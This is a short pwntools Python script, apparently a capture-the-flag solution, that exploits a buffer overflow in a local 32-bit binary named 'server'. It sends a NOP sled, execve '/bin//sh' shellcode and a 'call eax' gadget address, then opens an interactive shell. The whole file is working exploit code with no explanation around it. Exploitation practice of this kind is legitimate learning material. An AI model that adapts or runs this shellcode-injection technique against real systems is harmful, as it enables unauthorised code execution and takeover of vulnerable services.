from pwn import *
#offset = 76 - 23 - 4
p = process("./server")

# elf = context.binary = ELF("./server")


# p = gdb.debug(elf.path, ''' b *main ''') 

shellcode = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
call_eax = p32(0x08049019)

buf = b"\x90"* 20
buf += shellcode
buf += b"\x90"* 33
buf += call_eax



p.recvline()
p.recvline()

p.sendline(buf)

p.interactive()

